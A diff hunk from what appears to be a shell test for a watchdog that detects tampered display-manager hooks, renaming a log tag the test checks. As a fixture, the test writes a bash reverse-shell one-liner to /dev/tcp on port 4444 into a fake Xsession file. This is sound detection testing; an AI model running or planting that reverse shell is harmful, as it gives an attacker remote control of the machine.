@@ -325,6 +325,6 @@ seed_benign() {
     : > "${SELFDEF_TEST_LOGCAP}"
     printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/Xsession"
     run_wd
-    main_count=$(cap | grep -cE '^-t selfdef-display-manager-hooks -- ')
+    main_count=$(cap | grep -cE '^-t selfdef-dm-hooks -- ')
     [ "${main_count}" = "1" ]
 }
